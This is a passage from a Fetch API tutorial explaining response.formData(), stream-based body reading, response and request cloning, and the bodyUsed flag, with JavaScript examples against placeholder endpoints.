  const buffer = await response.arrayBuffer();
}
```

### Performance Considerations

#### Memory vs Streaming

For large files, `arrayBuffer()` loads everything into memory at once. Consider alternatives:

```javascript
// Instead of arrayBuffer() for large files
const response = await fetch('large-file.bin');
const reader = response.body.getReader();

while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  // Process chunk (Uint8Array)
  processChunk(value);
}
```

#### Comparison with Other Body Methods

- `arrayBuffer()`: Raw binary, requires typed array views
- `blob()`: Binary with MIME type, good for files
- `text()`: Decodes to UTF-8 string
- `json()`: Parses as JSON
- `formData()`: Parses as multipart/form-data

Choose `arrayBuffer()` when you need direct byte-level access or will convert to specific typed arrays.

### Browser Compatibility

The `arrayBuffer()` method is widely supported in modern browsers as part of the Fetch API specification. [Unverified: Specific version support] For legacy browser support details, check MDN or caniuse.com.

### Related Specifications

The method is defined in the Fetch Standard under the Body mixin interface, which is implemented by both Request and Response objects.·

---

## response.formData()

The `formData()` method of the Response interface reads the response body to completion and parses it as `FormData`. This method is essential for handling multipart/form-data responses from servers.

### Method Signature

```javascript
const formData = await response.formData();
```

Returns a Promise that resolves to a `FormData` object containing the parsed form data.

### Use Cases

#### Receiving File Uploads from Server

When a server sends back form data including files:

```javascript
const response = await fetch('/api/get-form-data');
const formData = await response.formData();

// Access form fields
const username = formData.get('username');
const file = formData.get('avatar'); // File object

// Iterate through all entries
for (const [key, value] of formData.entries()) {
  if (value instanceof File) {
    console.log(`${key}: ${value.name}, ${value.size} bytes`);
  } else {
    console.log(`${key}: ${value}`);
  }
}
```

#### Processing Multipart Responses

Handling responses with mixed text and binary data:

```javascript
const response = await fetch('/api/export-data');
const formData = await response.formData();

const metadata = formData.get('metadata'); // JSON string
const csvFile = formData.get('csv_export'); // File
const pdfReport = formData.get('report'); // File

const parsedMetadata = JSON.parse(metadata);
```

#### Server-Side Form Forwarding

Receiving form data that was submitted elsewhere:

```javascript
const response = await fetch('/api/forwarded-submission');
const formData = await response.formData();

// Re-submit to another endpoint
await fetch('/api/final-destination', {
  method: 'POST',
  body: formData // Forward as-is
});
```

### Content-Type Requirements

The method works with specific content types:

#### Primary: multipart/form-data

```javascript
// Server sets: Content-Type: multipart/form-data; boundary=----WebKitFormBoundary...
const response = await fetch('/api/data');
const formData = await response.formData();
```

#### application/x-www-form-urlencoded

```javascript
// Server sets: Content-Type: application/x-www-form-urlencoded
const response = await fetch('/api/urlencoded-data');
const formData = await response.formData();

// URL-encoded data is parsed into FormData entries
const name = formData.get('name');
const email = formData.get('email');
```

### Error Handling

#### Content-Type Mismatch

```javascript
try {
  const response = await fetch('/api/json-endpoint');
  const formData = await response.formData();
} catch (error) {
  // TypeError: Failed to fetch or invalid content type
  console.error('Cannot parse as FormData:', error);
}
```

#### Malformed Data

```javascript
try {
  const response = await fetch('/api/corrupt-form-data');
  const formData = await response.formData();
} catch (error) {
  console.error('Parsing failed:', error.message);
}
```

#### Network Errors

```javascript
try {
  const response = await fetch('/api/form-data');
  
  if (!response.ok) {
    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
  }
  
  const formData = await response.formData();
} catch (error) {
  console.error('Request failed:', error);
}
```

### Working with FormData Object

#### Reading Values

```javascript
const formData = await response.formData();

// Single value
const value = formData.get('fieldName');

// All values for a field (multiple entries with same name)
const allValues = formData.getAll('tags[]');

// Check existence
if (formData.has('optional_field')) {
  const optionalValue = formData.get('optional_field');
}
```

#### Iterating Entries

```javascript
const formData = await response.formData();

// entries() - key-value pairs
for (const [key, value] of formData.entries()) {
  console.log(key, value);
}

// keys() - field names only
for (const key of formData.keys()) {
  console.log(key);
}

// values() - values only
for (const value of formData.values()) {
  console.log(value);
}
```

#### Handling Files

```javascript
const formData = await response.formData();
const file = formData.get('upload');

if (file instanceof File) {
  console.log('File name:', file.name);
  console.log('File size:', file.size);
  console.log('MIME type:', file.type);
  console.log('Last modified:', new Date(file.lastModified));
  
  // Read file content
  const text = await file.text();
  const arrayBuffer = await file.arrayBuffer();
  const blob = file; // File extends Blob
}
```

### Body Consumption

#### Single Read Only

Once `formData()` is called, the response body is consumed:

```javascript
const response = await fetch('/api/data');
const formData = await response.formData();

// These will throw TypeError
try {
  await response.formData(); // Error: body already read
  await response.json();      // Error: body already read
  await response.text();      // Error: body already read
} catch (error) {
  console.error(error.message);
}
```

#### Checking Body State

```javascript
const response = await fetch('/api/data');

console.log(response.bodyUsed); // false

const formData = await response.formData();

console.log(response.bodyUsed); // true
```

#### Cloning for Multiple Reads

```javascript
const response = await fetch('/api/data');
const clonedResponse = response.clone();

const formData1 = await response.formData();
const formData2 = await clonedResponse.formData();
```

### Practical Patterns

#### Conditional Parsing Based on Content-Type

```javascript
const response = await fetch('/api/dynamic-endpoint');
const contentType = response.headers.get('content-type');

let data;
if (contentType?.includes('multipart/form-data') || 
    contentType?.includes('application/x-www-form-urlencoded')) {
  data = await response.formData();
} else if (contentType?.includes('application/json')) {
  data = await response.json();
} else {
  data = await response.text();
}
```

#### Extracting Files for Download

```javascript
const response = await fetch('/api/download-package');
const formData = await response.formData();

for (const [key, value] of formData.entries()) {
  if (value instanceof File) {
    // Create download link
    const url = URL.createObjectURL(value);
    const a = document.createElement('a');
    a.href = url;
    a.download = value.name;
    a.click();
    URL.revokeObjectURL(url);
  }
}
```

#### Converting to Plain Object

```javascript
const response = await fetch('/api/form-data');
const formData = await response.formData();

// Simple conversion (loses duplicate keys)
const obj = Object.fromEntries(formData.entries());

// Preserving all values
const objWithArrays = {};
for (const [key, value] of formData.entries()) {
  if (objWithArrays[key]) {
    if (Array.isArray(objWithArrays[key])) {
      objWithArrays[key].push(value);
    } else {
      objWithArrays[key] = [objWithArrays[key], value];
    }
  } else {
    objWithArrays[key] = value;
  }
}
```

#### Validating Before Processing

```javascript
async function processFormResponse(url) {
  const response = await fetch(url);
  
  // Verify content type
  const contentType = response.headers.get('content-type');
  if (!contentType?.includes('multipart/form-data') && 
      !contentType?.includes('application/x-www-form-urlencoded')) {
    throw new Error(`Expected form data, got ${contentType}`);
  }
  
  // Verify status
  if (!response.ok) {
    throw new Error(`HTTP error ${response.status}`);
  }
  
  const formData = await response.formData();
  
  // Validate required fields
  const requiredFields = ['id', 'name', 'file'];
  for (const field of requiredFields) {
    if (!formData.has(field)) {
      throw new Error(`Missing required field: ${field}`);
    }
  }
  
  return formData;
}
```

### Performance Considerations

#### Memory Usage with Large Files

```javascript
const response = await fetch('/api/large-file-package');
const formData = await response.formData();

// Entire response is loaded into memory
const largeFile = formData.get('video'); // File object in memory

// For very large files, consider streaming alternatives
// or processing on the server side
```

#### Streaming Alternative for Large Data

[Inference] For extremely large form data responses, the entire body must be loaded into memory before parsing. There is no built-in streaming parser for FormData in the Fetch API. If memory is a concern, consider:

- Having the server send files individually via separate endpoints
- Using chunked transfer with custom parsing
- Processing on the server and sending only results

### Browser Compatibility

The `formData()` method is widely supported in modern browsers. [Inference] It's part of the Fetch API standard and available in:

- Chrome/Edge (modern versions)
- Firefox (modern versions)
- Safari (modern versions)
- Node.js (via native fetch in v18+ or polyfills)

### Comparison with Other Body Methods

```javascript
const response = await fetch('/api/data');

// formData() - for multipart/form-data or urlencoded
const formData = await response.formData();

// json() - for application/json
const jsonData = await response.json();

// text() - for text/* or any content as string
const textData = await response.text();

// blob() - for binary data
const blobData = await response.blob();

// arrayBuffer() - for raw binary
const bufferData = await response.arrayBuffer();
```

Each method is optimized for its data type and cannot be used interchangeably after the first call.

---

## Body Stream Handling

The Fetch API treats response bodies as readable streams, providing fine-grained control over data consumption, memory management, and processing of large payloads.

### Stream Fundamentals

#### Body as ReadableStream

Response bodies are `ReadableStream` objects that can only be read once. Once consumed, the stream is locked and cannot be read again.

```javascript
const response = await fetch(url);
const stream = response.body; // ReadableStream

// Stream can only be consumed once
const data1 = await response.json(); // Consumes stream
const data2 = await response.text(); // Error: body already used
```

#### Body Usage Detection

```javascript
const response = await fetch(url);

console.log(response.bodyUsed); // false

await response.json();

console.log(response.bodyUsed); // true

// Attempting to read again throws
await response.text(); // TypeError: body stream already read
```

### Stream Reading Methods

#### High-Level Methods (Consume Entire Stream)

These methods read the complete stream and return a Promise:

```javascript
// JSON parsing
const jsonData = await response.json();

// Plain text
const textData = await response.text();

// ArrayBuffer (binary data)
const buffer = await response.arrayBuffer();

// Blob (file-like data)
const blob = await response.blob();

// FormData
const formData = await response.formData();
```

#### Low-Level Stream Reading

Direct access to the ReadableStream for custom processing:

```javascript
const response = await fetch(url);
const reader = response.body.getReader();

while (true) {
  const { done, value } = await reader.read();
  
  if (done) break;
  
  // value is a Uint8Array chunk
  console.log('Received chunk:', value);
}
```

### Progressive Data Processing

#### Streaming Large Responses

```javascript
async function streamResponse(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let result = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    // Decode chunk and process incrementally
    const chunk = decoder.decode(value, { stream: true });
    result += chunk;
    
    // Process partial data as it arrives
    console.log('Chunk received:', chunk.length, 'bytes');
  }
  
  return result;
}
```

#### Progress Tracking

```javascript
async function fetchWithProgress(url, onProgress) {
  const response = await fetch(url);
  const contentLength = response.headers.get('Content-Length');
  const total = parseInt(contentLength, 10);
  
  let loaded = 0;
  const reader = response.body.getReader();
  const chunks = [];
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    chunks.push(value);
    loaded += value.length;
    
    onProgress({ loaded, total, percentage: (loaded / total) * 100 });
  }
  
  // Reconstruct full response
  const chunksAll = new Uint8Array(loaded);
  let position = 0;
  for (const chunk of chunks) {
    chunksAll.set(chunk, position);
    position += chunk.length;
  }
  
  return chunksAll;
}

// Usage
fetchWithProgress('/large-file.zip', (progress) => {
  console.log(`Downloaded: ${progress.percentage.toFixed(2)}%`);
});
```

### Stream Cloning

#### Using clone() Method

The `Response.clone()` method creates a duplicate that can be consumed independently:

```javascript
const response = await fetch(url);

// Clone before consuming
const clone = response.clone();

// Both can be consumed independently
const json = await response.json();
const text = await clone.text();
```

#### Clone Use Cases

```javascript
// Caching while processing
async function fetchAndCache(url) {
  const response = await fetch(url);
  
  if (response.ok) {
    // Clone for cache
    const cacheResponse = response.clone();
    
    // Store in cache
    caches.open('my-cache').then(cache => {
      cache.put(url, cacheResponse);
    });
    
    // Process original
    return response.json();
  }
}
```

**Important**: Cloning must occur before the original stream is consumed. Cloning after consumption throws an error.

```javascript
const response = await fetch(url);
await response.json(); // Consumes stream

const clone = response.clone(); // TypeError: body already used
```

### Stream Transformation

#### Using TransformStream

```javascript
async function transformStream(url) {
  const response = await fetch(url);
  
  const transformStream = new TransformStream({
    transform(chunk, controller) {
      // Modify chunks as they arrive
      const modified = chunk.map(byte => byte ^ 0xFF); // Example: invert bits
      controller.enqueue(modified);
    }
  });
  
  const transformedStream = response.body.pipeThrough(transformStream);
  const reader = transformedStream.getReader();
  
  // Read transformed data
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    // Process transformed chunks
  }
}
```

#### Custom Processing Pipeline

```javascript
async function processStreamPipeline(url) {
  const response = await fetch(url);
  
  // Decompress
  const decompressStream = new DecompressionStream('gzip');
  
  // Transform
  const transformStream = new TransformStream({
    transform(chunk, controller) {
      // Custom processing
      controller.enqueue(chunk);
    }
  });
  
  // Pipeline
  const processedStream = response.body
    .pipeThrough(decompressStream)
    .pipeThrough(transformStream);
  
  return new Response(processedStream);
}
```

### Memory Management

#### Streaming vs Buffering

**Buffering (high memory)**:

```javascript
// Loads entire response into memory
const response = await fetch(hugeFileUrl);
const blob = await response.blob(); // Memory spike
```

**Streaming (low memory)**:

```javascript
// Processes chunks incrementally
const response = await fetch(hugeFileUrl);
const reader = response.body.getReader();

while (true) {
  const { done, value } = await reader.read();
  if (done) break;
  
  // Process and discard each chunk
  await processChunk(value);
  // Chunk can be garbage collected
}
```

#### Backpressure Handling

```javascript
async function streamWithBackpressure(url, processor) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    
    // Wait for processor to finish before reading next chunk
    await processor(value);
    
    // Natural backpressure: won't read next chunk
    // until current chunk is processed
  }
}
```

### Cancellation and Cleanup

#### AbortController with Streams

```javascript
const controller = new AbortController();
const signal = controller.signal;

const response = await fetch(url, { signal });
const reader = response.body.getReader();

// Cancel after 5 seconds
setTimeout(() => controller.abort(), 5000);

try {
  while (true) {
    const { done, value } = await reader.read();
    if (done) break;
    // Process chunks
  }
} catch (error) {
  if (error.name === 'AbortError') {
    console.log('Stream cancelled');
  }
} finally {
  reader.releaseLock(); // Clean up
}
```

#### Manual Stream Cancellation

```javascript
const response = await fetch(url);
const reader = response.body.getReader();

try {
  const { done, value } = await reader.read();
  
  if (someCondition) {
    reader.cancel('No longer needed');
    return;
  }
  
  // Continue reading...
} finally {
  reader.releaseLock();
}
```

### Streaming Uploads

#### Sending Stream as Request Body

```javascript
// Create readable stream for upload
const stream = new ReadableStream({
  start(controller) {
    // Generate data chunks
    for (let i = 0; i < 100; i++) {
      controller.enqueue(new Uint8Array([i]));
    }
    controller.close();
  }
});

// Upload stream
await fetch('/upload', {
  method: 'POST',
  body: stream,
  headers: {
    'Content-Type': 'application/octet-stream'
  }
});
```

#### Streaming File Upload with Progress

```javascript
async function uploadFileStream(file, onProgress) {
  const stream = file.stream();
  let uploaded = 0;
  
  const monitoredStream = new ReadableStream({
    async start(controller) {
      const reader = stream.getReader();
      
      while (true) {
        const { done, value } = await reader.read();
        
        if (done) {
          controller.close();
          break;
        }
        
        uploaded += value.length;
        onProgress({ uploaded, total: file.size });
        
        controller.enqueue(value);
      }
    }
  });
  
  await fetch('/upload', {
    method: 'POST',
    body: monitoredStream,
    duplex: 'half' // Required for streaming uploads
  });
}
```

### Text Streaming Patterns

#### Line-by-Line Processing

```javascript
async function streamLines(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let buffer = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) {
      // Process remaining buffer
      if (buffer) console.log('Last line:', buffer);
      break;
    }
    
    buffer += decoder.decode(value, { stream: true });
    
    // Split on newlines
    const lines = buffer.split('\n');
    
    // Keep last incomplete line in buffer
    buffer = lines.pop() || '';
    
    // Process complete lines
    for (const line of lines) {
      console.log('Line:', line);
    }
  }
}
```

#### JSON Streaming (NDJSON)

```javascript
async function streamNDJSON(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let buffer = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    buffer += decoder.decode(value, { stream: true });
    const lines = buffer.split('\n');
    buffer = lines.pop() || '';
    
    for (const line of lines) {
      if (line.trim()) {
        try {
          const json = JSON.parse(line);
          console.log('JSON object:', json);
        } catch (e) {
          console.error('Parse error:', e);
        }
      }
    }
  }
}
```

### Server-Sent Events Simulation

```javascript
async function streamSSE(url, onMessage) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  
  let buffer = '';
  
  while (true) {
    const { done, value } = await reader.read();
    
    if (done) break;
    
    buffer += decoder.decode(value, { stream: true });
    const events = buffer.split('\n\n');
    buffer = events.pop() || '';
    
    for (const event of events) {
      const lines = event.split('\n');
      const data = lines
        .filter(line => line.startsWith('data:'))
        .map(line => line.slice(5).trim())
        .join('\n');
      
      if (data) {
        onMessage(data);
      }
    }
  }
}
```

### Error Handling in Streams

#### Stream Read Errors

```javascript
async function streamWithErrorHandling(url) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  
  try {
    while (true) {
      const { done, value } = await reader.read();
      
      if (done) break;
      
      // Process chunk
      await processChunk(value);
    }
  } catch (error) {
    console.error('Stream error:', error);
    
    // Clean up
    await reader.cancel();
  } finally {
    reader.releaseLock();
  }
}
```

#### Timeout During Streaming

```javascript
async function streamWithTimeout(url, timeoutMs) {
  const response = await fetch(url);
  const reader = response.body.getReader();
  
  const timeout = (ms) => new Promise((_, reject) =>
    setTimeout(() => reject(new Error('Stream timeout')), ms)
  );
  
  try {
    while (true) {
      const { done, value } = await Promise.race([
        reader.read(),
        timeout(timeoutMs)
      ]);
      
      if (done) break;
      
      // Process chunk
    }
  } catch (error) {
    await reader.cancel();
    throw error;
  } finally {
    reader.releaseLock();
  }
}
```

### Browser Compatibility Notes

[Unverified: Specific browser version requirements without current checking]

ReadableStream support is available in modern browsers. Stream operations like `pipeThrough()` and `TransformStream` have more limited support in older browsers. The `duplex: 'half'` option for streaming uploads is a newer addition with varying browser support.

### Performance Considerations

**Stream reading is more efficient for**:

- Large responses (>1MB)
- Real-time data processing
- Memory-constrained environments
- Progress tracking requirements

**Direct methods (json(), text()) are simpler for**:

- Small responses (<100KB)
- Simple parsing needs
- When entire payload is needed before processing

[Inference: Performance characteristics based on typical stream behavior patterns, not empirical benchmarks]

---

## Multiple Body Reads

### The One-Time Read Constraint

Response and request bodies in the Fetch API cannot be read more than once. This fundamental constraint exists because request and response bodies are treated as streams, and streams are consumed when read.

**Why This Limitation Exists:**

The streaming design provides memory efficiency. When operations like cache.put(request, response) are called, the response stream is piped to the cache, allowing large responses to be handled without buffering them into memory. This prevents the need to store potentially massive response payloads entirely in RAM before processing them.

Once a body has been read with one method like response.text(), calling another method like response.json() will fail because the body content has already been processed.

#### Example of Failed Multiple Reads

```javascript
let response = await fetch(url);
let text = await response.text(); // response body consumed
let parsed = await response.json(); // fails (already consumed)
```

**[Inference] This will throw an error** because after the first read operation (`response.text()`), the stream has been consumed and is no longer available.

### Detecting Body Usage Status

#### Response.bodyUsed Property

The bodyUsed property is a read-only boolean value that indicates whether the body has been read yet. Reading the body of a response changes the value of bodyUsed from false to true.

**Usage Example:**

```javascript
const responsePromise = fetch("/api/data");

const response = await responsePromise;
if (response.bodyUsed) {
  console.log("Body has already been used!");
} else {
  const result = await response.blob();
  // process result
}
```

**[Inference] The bodyUsed property provides a way to guard against attempting to read an already-consumed body**, which would otherwise result in an error.

### Solution: Response.clone()

#### The clone() Method

The clone() method of the Response interface creates a clone of a response object, identical in every way, but stored in a different variable. clone() throws a TypeError if the response body has already been used.

**[Inference] Cloning must occur before any read operations** to be effective. Once a body is consumed, it cannot be cloned.

#### Basic Clone Pattern

```javascript
fetch('/api/data').then((response) => {
  const response2 = response.clone();
  
  response.blob().then((myBlob) => {
    const objectURL = URL.createObjectURL(myBlob);
    image1.src = objectURL;
  });
  
  response2.blob().then((myBlob) => {
    const objectURL = URL.createObjectURL(myBlob);
    image2.src = objectURL;
  });
});
```

#### Common Use Cases

**1. Try JSON, Fallback to Text:**

```javascript
fetch('/data').then(function(response) {
  return response.clone().json().catch(function() {
    // parsing as JSON failed, let's get the text
    return response.text().then(function(text) {
      // process text
    });
  });
});
```

By calling clone before the first read, the original response can still be read after the cloned version is consumed.

**2. Cache and Return Pattern (Service Workers):**

```javascript
self.addEventListener('fetch', (event) => {
  event.respondWith(
    caches.open('content').then((cache) => {
      return fetch(event.request).then((response) => {
        // Store clone in cache
        cache.put(event.request, response.clone());
        // Return original to browser
        return response;
      });
    })
  );
});
```

When sending a clone into the cache and the original back to the browser, both streams are being consumed simultaneously, maintaining memory efficiency without needing to hold the original in memory.

### Backpressure and Memory Considerations

#### Understanding Backpressure

Like the underlying ReadableStream.tee API, the body of a cloned Response will signal backpressure at the rate of the faster consumer of the two bodies, and unread data is enqueued internally on the slower consumed body without any limit or backpressure.

Backpressure refers to the mechanism by which the streaming consumer of data slows down the producer of data so as not to load large amounts of data in memory that is waiting to be used by the application.

#### Memory Implications

If only one cloned branch is consumed, then the entire body will be buffered in memory. Therefore, clone() is one way to read a response twice in sequence, but you should not use it to read very large bodies in parallel at different speeds.

**[Inference] Sequential consumption of clones is safer for large responses** than parallel consumption at significantly different speeds, as the latter can lead to excessive memory buffering.

### Request Body Cloning

The same constraints and solutions apply to Request objects.

#### Failed Request Reuse:

```javascript
const request = new Request("https://example.org/post", {
  method: "POST",
  body: JSON.stringify({ username: "example" })
});

const response1 = await fetch(request);
console.log(response1.status);

// Will throw: "Body has already been consumed."
const response2 = await fetch(request);
```

#### Correct Approach with Cloning:

```javascript
const request1 = new Request("https://example.org/post", {
  method: "POST",
  body: JSON.stringify({ username: "example" })
});

const request2 = request1.clone();

const response1 = await fetch(request1);
console.log(response1.status);

const response2 = await fetch(request2);
console.log(response2.status);
```

Instead of reusing a consumed request, create a clone of the request before sending it.

### Best Practices

**1. Clone Before Reading:** Always call `clone()` before any body-reading operations if you need multiple reads.

**2. Check bodyUsed:** Use the `bodyUsed` property to verify whether a body has been consumed before attempting to read it.

**3. Consider Memory Impact:** For large responses, prefer sequential reads or single reads when possible.

**4. Service Worker Pattern:** When caching responses, clone before storing so the original can be returned to the client.

**5. Error Handling Patterns:** Clone responses when implementing fallback logic that requires trying multiple parsing methods.

### Limitations and Caveats

**Clone Timing:** clone() throws a TypeError if the response body has already been used. **[Inference] There is no way to "unconsume" a body once it has been read.**

**Large Response Warning:** **[Unverified] Cloning very large responses and consuming them at different rates may cause memory issues** due to buffering of unread data in the slower consumer.

**Single Reader Lock:** A stream can't be read by more than one reader at once. **[Inference] Without cloning via the tee() method or response.clone(), attempting simultaneous reads will fail.**

---

## Body Used Flag

The body used flag is an internal state indicator that tracks whether a response or request body has been consumed. Once a body is read using any of the body consumption methods (`json()`, `text()`, `blob()`, `arrayBuffer()`, `formData()`), the body is marked as "used" and cannot be read again.

### The bodyUsed Property

The `bodyUsed` property is a read-only boolean that indicates whether the body has been consumed.

```javascript
const response = await fetch('https://api.example.com/data');

console.log(response.bodyUsed); // false

const data = await response.json();

console.log(response.bodyUsed); // true
```

### Why Bodies Can Only Be Read Once

HTTP response bodies are streams of data. Once the stream is consumed, it cannot be "rewound" to read again. This is by design for performance and memory efficiency—the browser doesn't keep the entire response in memory after it's been processed.

```javascript
const response = await fetch('https://api.example.com/data');

const data = await response.json(); // First read - works
console.log(response.bodyUsed); // true

const dataAgain = await response.json(); // Second read - fails
// TypeError: Failed to execute 'json' on 'Response': body stream already read
```

### All Body Consumption Methods Set the Flag

Every method that reads the body sets `bodyUsed` to `true`:

```javascript
const response1 = await fetch('https://api.example.com/data');
await response1.json();
console.log(response1.bodyUsed); // true

const response2 = await fetch('https://api.example.com/data');
await response2.text();
console.log(response2.bodyUsed); // true

const response3 = await fetch('https://api.example.com/data');
await response3.blob();
console.log(response3.bodyUsed); // true

const response4 = await fetch('https://api.example.com/data');
await response4.arrayBuffer();
console.log(response4.bodyUsed); // true

const response5 = await fetch('https://api.example.com/data');
await response5.formData();
console.log(response5.bodyUsed); // true
```

### Checking Before Consumption

Always check `bodyUsed` before attempting to read a body, especially when passing responses through multiple functions.

```javascript
async function processResponse(response) {
  if (response.bodyUsed) {
    throw new Error('Response body has already been consumed');
  }
  
  return await response.json();
}

const response = await fetch('https://api.example.com/data');
const data1 = await processResponse(response); // Works

const data2 = await processResponse(response); // Throws error
```

### Practical Pattern: Check Before Read

```javascript
async function safeReadJSON(response) {
  if (response.bodyUsed) {
    console.warn('Body already used, cannot read');
    return null;
  }
  
  try {
    return await response.json();
  } catch (error) {
    console.error('Failed to parse JSON:', error);
    return null;
  }
}

const response = await fetch('https://api.example.com/data');
const data = await safeReadJSON(response); // Works
const retry = await safeReadJSON(response); // Returns null with warning
```

### Cloning Responses to Read Multiple Times

Use `response.clone()` to create a copy of the response before consuming the body. Each clone has its own independent body stream.

```javascript
const response = await fetch('https://api.example.com/data');

console.log(response.bodyUsed); // false

const clone = response.clone();

console.log(response.bodyUsed); // false
console.log(clone.bodyUsed); // false

// Read from original
const data1 = await response.json();
console.log(response.bodyUsed); // true
console.log(clone.bodyUsed); // false - still independent

// Read from clone
const data2 = await clone.json();
console.log(clone.bodyUsed); // true
```

### Multiple Processing Paths

Cloning is useful when you need to process the response in different ways simultaneously.

```javascript
const response = await fetch('https://api.example.com/data');

// Create clones for different purposes
const logClone = response.clone();
const cacheClone = response.clone();

// Log raw text (without consuming main response)
logClone.text().then(text => {
  console.log('Raw response:', text);
});

// Cache the response
cacheClone.blob().then(blob => {
  // Store in IndexedDB or Cache API
});

// Process the main response
const data = await response.json();
// Use data normally
```

### Cloning Limitations

You cannot clone a response whose body has already been consumed.

```javascript
const response = await fetch('https://api.example.com/data');

const data = await response.json();
console.log(response.bodyUsed); // true

const clone = response.clone(); // TypeError: Failed to execute 'clone' on 'Response': Response body is already used
```

### Pattern: Clone Before Any Consumption

```javascript
async function processWithLogging(url) {
  const response = await fetch(url);
  
  // Clone BEFORE consuming
  const loggingClone = response.clone();
  
  // Log in background
  loggingClone.text().then(text => {
    console.log(`Response from ${url}:`, text);
  });
  
  // Process normally
  return await response.json();
}
```

### Body Streams and the Used Flag

The body used flag is directly tied to the underlying `ReadableStream` in `response.body`.

```javascript
const response = await fetch('https://api.example.com/data');

console.log(response.bodyUsed); // false
console.log(response.body.locked); // false

// Start reading the stream
const reader = response.body.getReader();

console.log(response.bodyUsed); // false (not fully consumed yet)
console.log(response.body.locked); // true (stream is locked to this reader)

// Read all chunks
let result = await reader.read();
while (!result.done) {
  result = await reader.read();
}

console.log(response.bodyUsed); // true (fully consumed)
```

### Empty Bodies

Responses with no body (like 204 No Content) or methods that don't return bodies (like HEAD requests) still have the `bodyUsed` property, but reading them may behave differently.

```javascript
// HEAD request - no body expected
const headResponse = await fetch('https://api.example.com/data', {
  method: 'HEAD'
});

console.log(headResponse.bodyUsed); // false
const data = await headResponse.json(); // May resolve to null or throw
console.log(headResponse.bodyUsed); // true
```

```javascript
// 204 No Content response
const response = await fetch('https://api.example.com/delete/123', {
  method: 'DELETE'
});

if (response.status === 204) {
  console.log(response.bodyUsed); // false
  // Don't attempt to read body - there isn't one
  // Attempting to read may resolve to empty string or throw
}
```

### Request Bodies and bodyUsed

The `bodyUsed` flag also exists on `Request` objects, following the same behavior.

```javascript
const request = new Request('https://api.example.com/data', {
  method: 'POST',
  body: JSON.stringify({ name: 'John' })
});

console.log(request.bodyUsed); // false

const bodyText = await request.text();
console.log(request.bodyUsed); // true

// Cannot reuse this request
fetch(request); // May fail or send empty body
```

### Cloning Requests

Similar to responses, you can clone requests to send them multiple times.

```javascript
const request = new Request('https://api.example.com/data', {
  method: 'POST',
  body: JSON.stringify({ name: 'John' })
});

const clone = request.clone();

// Send original request
const response1 = await fetch(request);
console.log(request.bodyUsed); // true

// Send cloned request
const response2 = await fetch(clone);
console.log(clone.bodyUsed); // true after fetch
```

### Common Pitfall: Passing Responses Between Functions

```javascript
// Problematic pattern
async function validateResponse(response) {
  const data = await response.json(); // Consumes body
  
  if (!data.isValid) {
    throw new Error('Invalid data');
  }
  
  return response; // Body is already consumed!
}

async function processResponse(response) {
  const data = await response.json(); // Error: body already used
  // Process data
}

// Usage
const response = await fetch('https://api.example.com/data');
const validated = await validateResponse(response);
await processResponse(validated); // Fails!
```

### Solution: Pass Data, Not Responses

```javascript
// Better pattern
async function validateResponse(response) {
  const data = await response.json();
  
  if (!data.isValid) {
    throw new Error('Invalid data');
  }
  
  return data; // Return the data, not the response
}

async function processData(data) {
  // Process data directly
}

// Usage
const response = await fetch('https://api.example.com/data');
const data = await validateResponse(response);
await processData(data); // Works!
```

### Alternative Solution: Clone Before Passing

```javascript
async function validateResponse(response) {
  const clone = response.clone();
  const data = await clone.json();
  
  if (!data.isValid) {
    throw new Error('Invalid data');
  }
  
  return response; // Original response body still intact
}

async function processResponse(response) {
  const data = await response.json(); // Works - body not consumed
  // Process data
}

// Usage
const response = await fetch('https://api.example.com/data');
const validated = await validateResponse(response);
await processResponse(validated); // Works!
```

### Middleware Pattern with Cloning

```javascript
async function applyMiddleware(response, middlewares) {
  let currentResponse = response;
  
  for (const middleware of middlewares) {
    // Clone before passing to each middleware
    const clone = currentResponse.clone();
    currentResponse = await middleware(clone);
  }
  
  return currentResponse;
}

// Middleware functions
async function loggingMiddleware(response) {
  const clone = response.clone();
  clone.text().then(text => console.log('Response:', text));
  return response;
}

async function cachingMiddleware(response) {
  const clone = response.clone();
  // Cache the clone
  caches.open('api-cache').then(cache => {
    cache.put(response.url, clone);
  });
  return response;
}

// Usage
const response = await fetch('https://api.example.com/data');
const processedResponse = await applyMiddleware(response, [
  loggingMiddleware,
  cachingMiddleware
]);
const data = await processedResponse.json();
```

### Debugging Body Consumption Issues

```javascript
// Wrapper to track body consumption
function trackBodyUsage(response, label) {
  console.log(`[${label}] Initial bodyUsed:`, response.bodyUsed);
  
  const originalJson = response.json.bind(response);
  const originalText = response.text.bind(response);
  const originalBlob = response.blob.bind(response);
  const originalArrayBuffer = response.arrayBuffer.bind(response);
  
  response.json = async function() {
    console.log(`[${label}] Calling json(), bodyUsed before:`, this.bodyUsed);
    const result = await originalJson();
    console.log(`[${label}] Called json(), bodyUsed after:`, this.bodyUsed);
    return result;
  };
  
  response.text = async function() {
    console.log(`[${label}] Calling text(), bodyUsed before:`, this.bodyUsed);
    const result = await originalText();
    console.log(`[${label}] Called text(), bodyUsed after:`, this.bodyUsed);
    return result;
  };
  
  // Similar for other methods...
  
  return response;
}

// Usage
const response = await fetch('https://api.example.com/data');
const tracked = trackBodyUsage(response, 'API Response');
const data = await tracked.json();
// Logs show exactly when body was consumed
```

### Performance Considerations

#### Cloning Cost

Cloning a response creates a duplicate of the body stream, which has memory and performance implications.

```javascript
const response = await fetch('https://api.example.com/large-file');

// Creates multiple copies in memory
const clone1 = response.clone();
const clone2 = response.clone();
const clone3 = response.clone();

// Each clone consumes memory until its body is read
// Be mindful with large responses
```

#### When Not to Clone

```javascript
// Unnecessary cloning
async function unnecessaryClone(response) {
  const clone = response.clone();
  return await clone.json(); // Original response is never used
}

// Better - just use the original
async function efficient(response) {
  return await response.json();
}
